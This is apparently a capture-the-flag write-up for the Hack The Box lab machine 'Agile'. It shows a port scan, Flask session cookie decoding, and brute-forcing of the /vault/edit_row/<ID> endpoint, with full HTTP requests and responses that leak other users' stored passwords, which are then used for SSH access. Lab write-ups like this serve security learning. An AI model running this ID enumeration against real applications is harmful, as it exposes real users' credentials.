---
cover: ../.gitbook/assets/image (7).png
coverY: 0
---

# \[Medium] Agile

## **Info**

<table><thead><tr><th>Name</th><th>Info</th><th data-hidden></th></tr></thead><tbody><tr><td>IP</td><td><mark style="color:blue;">10.129.171.197</mark></td><td></td></tr><tr><td>Domain</td><td><mark style="color:blue;">superpass.htb</mark></td><td></td></tr></tbody></table>

## **Services**

{% code overflow="wrap" %}
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA)
|_  256 65c1480d88cbb975a02ca5e6377e5106 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: SuperPassword \xF0\x9F\xA6\xB8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{% endcode %}

## Web

### Main page

<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

### **Leaked app path**

<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

### Inside registred account

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### **Cookies**

| Name                                               | Value                                                                                                                                                                                                                                                                                                                                 |
| -------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| <mark style="color:purple;">session</mark>         | <mark style="color:green;">.eJwlTstqwzAQ\_BWx51D03LX8Fb2XECTtbmxwm2A5p5B\_r0Iu82CGYZ5w0a30RTrMP08wxyD4ld7LVeAE35uULma7Xc36Z46bKa2N0BzL2s19dL7g\_DqfxsgufYH52B8y3MowQ6KEEjIiUuVqWaY2CbmQSaLn5skm61wiV1UQw8SJSTB7bVEHop9ysrEmW7W5xOwapeLfEyw8FAblXDlE1UpZyKKWFjgGFziT9eP-5dFl\_7xxHl7\_E01GcA.ZAe8xQ.eeKuZVIyfmAdiMrKjGNYJ04gVtk</mark> |
| <mark style="color:purple;">remember\_token</mark> | <mark style="color:green;">12\|a7304ebbb81e83ee62f07550bdac6acb5b315624abbb84dcc1b7435dae353413a59a4f70034c9469acd4d2a0d5ff2cd45be790de047fce0bf168471d90f66aab</mark>                                                                                                                                                                |



### Cookies-Unsign

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask#flask-unsign" %}

```bash
flask-unsign --decode --cookie '$COOKIE'
```

After cookie decode:

<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>



### Intercepting traffic from website

After a time, I found out that HTTP request when we changing password entry seems to be interesting. (endpoint:  <mark style="color:red;">/vault/edit\_row/\<ID></mark> )

GET request:

```http
GET /vault/edit_row/1 HTTP/1.1
Host: superpass.htb
HX-Request: true
HX-Current-URL: http://superpass.htb/vault
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept: */*
Referer: http://superpass.htb/vault
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: remember_token=12|a7304ebbb81e83ee62f07550bdac6acb5b315624abbb84dcc1b7435dae353413a59a4f70034c9469acd4d2a0d5ff2cd45be790de047fce0bf168471d90f66aab; session=.eJwlTstqwzAQ_BWx51D03LX8Fb2XECTtbmxwm2A5p5B_r0Iu82CGYZ5w0a30RTrMP08wxyD4ld7LVeAE35uULma7Xc36Z46bKa2N0BzL2s19dL7g_DqfxsgufYH52B8y3MowQ6KEEjIiUuVqWaY2CbmQSaLn5skm61wiV1UQw8SJSTB7bVEHop9ysrEmW7W5xOwapeLfEyw8FAblXDlE1UpZyKKWFjgGFziT9eP-5dFl_7xxHl7_E01GcA.ZAe8xQ.eeKuZVIyfmAdiMrKjGNYJ04gVtk
Connection: close
```

&#x20;Response:

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 07 Mar 2023 23:36:49 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Cookie
Content-Length: 619

<tr>
    <td>
        
        <a hx-post="/vault/add_row" 
            hx-include="closest tr"
            hx-trigger="click, keydown[key=='Enter'] from:closest tr">
            <i class="fas fa-save"></i>
        </a>
        <i _="on click hide closest <tr/>
              on keydown[key=='Escape'] from closest <tr/> hide closest <tr/>" class="fa-solid fa-trash"></i></a>
        
    </td>
    <td><input type="text" name="url" placeholder=" site"  /></td>
    <td><input type="text" name="username" placeholder=" username"  /></td>
    <td><input type="text" name="password" placeholder=" password"  /></td>
</tr>
```

We can bruteforce ID endpoint to leak entries of other users. After some time, found some interesting creds:

**ID = **<mark style="color:blue;">**4**</mark>**:**

<pre class="language-http"><code class="lang-http">HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 07 Mar 2023 23:31:20 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Cookie
Content-Length: 682

<strong>&#x3C;tr>
</strong>    &#x3C;td>
        
        &#x3C;a hx-post="/vault/update/4" 
            hx-include="closest tr"
            hx-trigger="click, keydown[key=='Enter'] from:closest tr">
            &#x3C;i class="fas fa-save">&#x3C;/i>
        &#x3C;/a>
        &#x3C;a hx-get="/vault/row/4" 
            hx-trigger="click, keydown[key=='Escape'] from:closest tr">
            &#x3C;i class="fas fa-undo">&#x3C;/i>
        &#x3C;/a>
        
    &#x3C;/td>
    &#x3C;td>&#x3C;input type="text" name="url" placeholder=" site" value="mgoblog.com" />&#x3C;/td>
    &#x3C;td>&#x3C;input type="text" name="username" placeholder=" username" value="0xdf" />&#x3C;/td>
    &#x3C;td>&#x3C;input type="text" name="password" placeholder=" password" value="5b133f7a6a1c180646cb" />&#x3C;/td>
&#x3C;/tr>
</code></pre>

**ID = **<mark style="color:blue;">**3**</mark>**:**

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 07 Mar 2023 23:39:46 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Cookie
Content-Length: 685

<tr>
    <td>
        
        <a hx-post="/vault/update/3" 
            hx-include="closest tr"
            hx-trigger="click, keydown[key=='Enter'] from:closest tr">
            <i class="fas fa-save"></i>
        </a>
        <a hx-get="/vault/row/3" 
            hx-trigger="click, keydown[key=='Escape'] from:closest tr">
            <i class="fas fa-undo"></i>
        </a>
        
    </td>
    <td><input type="text" name="url" placeholder=" site" value="hackthebox.com" /></td>
    <td><input type="text" name="username" placeholder=" username" value="0xdf" /></td>
    <td><input type="text" name="password" placeholder=" password" value="762b430d32eea2f12970" /></td>
</tr>    
```

**ID = **<mark style="color:blue;">**7**</mark>**:**

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 07 Mar 2023 23:41:40 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Cookie
Content-Length: 684

<tr>
    <td>
        
        <a hx-post="/vault/update/7" 
            hx-include="closest tr"
            hx-trigger="click, keydown[key=='Enter'] from:closest tr">
            <i class="fas fa-save"></i>
        </a>
        <a hx-get="/vault/row/7" 
            hx-trigger="click, keydown[key=='Escape'] from:closest tr">
            <i class="fas fa-undo"></i>
        </a>
        
    </td>
    <td><input type="text" name="url" placeholder=" site" value="ticketmaster" /></td>
    <td><input type="text" name="username" placeholder=" username" value="corum" /></td>
    <td><input type="text" name="password" placeholder=" password" value="9799588839ed0f98c211" /></td>
</tr>
```



**ID = **<mark style="color:blue;">**8**</mark>**:**&#x20;

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 07 Mar 2023 23:44:21 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Cookie
Content-Length: 677

<tr>
    <td>
        
        <a hx-post="/vault/update/8" 
            hx-include="closest tr"
            hx-trigger="click, keydown[key=='Enter'] from:closest tr">
            <i class="fas fa-save"></i>
        </a>
        <a hx-get="/vault/row/8" 
            hx-trigger="click, keydown[key=='Escape'] from:closest tr">
            <i class="fas fa-undo"></i>
        </a>
        
    </td>
    <td><input type="text" name="url" placeholder=" site" value="agile" /></td>
    <td><input type="text" name="username" placeholder=" username" value="corum" /></td>
    <td><input type="text" name="password" placeholder=" password" value="5db7caa1d13cc37c9fc2" /></td>
</tr>
```



Connect via SSH by last creds and got user flag:

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
